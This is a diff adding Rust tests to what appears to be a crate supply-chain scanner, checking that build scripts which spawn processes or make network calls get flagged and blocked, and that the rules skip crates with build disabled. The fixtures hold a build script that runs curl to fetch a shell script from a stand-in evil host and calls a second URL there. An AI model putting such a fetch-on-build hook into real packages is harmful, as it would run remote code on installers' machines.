@@ -134,6 +134,110 @@ fn main() {
 }
 
 #[test]
+fn crates_custom_build_script_subprocess_and_network_blocks() -> anyhow::Result<()> {
+    let registry = "https://mock.registry";
+    let cargo_toml =
+        b"[package]\nname = \"custom-build\"\nversion = \"1.0.0\"\nbuild = \"build/main.rs\"\n";
+    let build_rs = br#"
+fn main() {
+    let _ = std::process::Command::new("curl")
+        .arg("http://evil.example.invalid/p.sh")
+        .output();
+    let _ = ureq::get("http://evil.example.invalid/metadata").call();
+}
+"#;
+    let crate_bytes = make_crate(
+        "custom-build",
+        "1.0.0",
+        &[
+            ("Cargo.toml", cargo_toml),
+            ("build/main.rs", build_rs),
+            ("src/lib.rs", b""),
+        ],
+    );
+    let dl_url = format!("{registry}/api/v1/crates/custom-build/1.0.0/download");
+    let pack = packument("custom-build", "1.0.0", &sha256_hex(&crate_bytes));
+
+    let transport = MockTransport::new();
+    transport.insert(
+        &format!("{registry}/api/v1/crates/custom-build"),
+        pack.into_bytes(),
+    );
+    transport.insert(&dl_url, crate_bytes);
+
+    let opts = CratesFetchOptions {
+        registry: registry.to_string(),
+        ..CratesFetchOptions::default()
+    };
+    let pkg = CrateRef::parse("custom-build")?;
+    let report = fetch_and_scan_crate(&pkg, &opts, &transport)?;
+    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
+
+    assert!(
+        rule_ids.contains(&"build-rs-execution"),
+        "got: {rule_ids:?}"
+    );
+    assert!(
+        rule_ids.contains(&"build-rs-subprocess"),
+        "got: {rule_ids:?}"
+    );
+    assert!(rule_ids.contains(&"build-rs-network"), "got: {rule_ids:?}");
+    assert_eq!(report.decision, Decision::Block);
+    Ok(())
+}
+
+#[test]
+fn crates_build_false_does_not_apply_build_script_rules() -> anyhow::Result<()> {
+    let registry = "https://mock.registry";
+    let cargo_toml = b"[package]\nname = \"manual-helper\"\nversion = \"1.0.0\"\nbuild = false\n";
+    let build_rs = br#"
+fn main() {
+    let _ = std::process::Command::new("curl")
+        .arg("http://evil.example.invalid/p.sh")
+        .output();
+    let _ = ureq::get("http://evil.example.invalid/metadata").call();
+}
+"#;
+    let crate_bytes = make_crate(
+        "manual-helper",
+        "1.0.0",
+        &[
+            ("Cargo.toml", cargo_toml),
+            ("build.rs", build_rs),
+            ("src/lib.rs", b""),
+        ],
+    );
+    let dl_url = format!("{registry}/api/v1/crates/manual-helper/1.0.0/download");
+    let pack = packument("manual-helper", "1.0.0", &sha256_hex(&crate_bytes));
+
+    let transport = MockTransport::new();
+    transport.insert(
+        &format!("{registry}/api/v1/crates/manual-helper"),
+        pack.into_bytes(),
+    );
+    transport.insert(&dl_url, crate_bytes);
+
+    let opts = CratesFetchOptions {
+        registry: registry.to_string(),
+        ..CratesFetchOptions::default()
+    };
+    let pkg = CrateRef::parse("manual-helper")?;
+    let report = fetch_and_scan_crate(&pkg, &opts, &transport)?;
+    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
+
+    assert!(
+        !rule_ids.contains(&"build-rs-execution"),
+        "got: {rule_ids:?}"
+    );
+    assert!(
+        !rule_ids.contains(&"build-rs-subprocess"),
+        "got: {rule_ids:?}"
+    );
+    assert!(!rule_ids.contains(&"build-rs-network"), "got: {rule_ids:?}");
+    Ok(())
+}
+
+#[test]
 fn crates_xor_decryption_loop_blocks() {
     let registry = "https://mock.registry";
     let cargo_toml = b"[package]\nname = \"xorcrate\"\nversion = \"1.0.0\"\n";
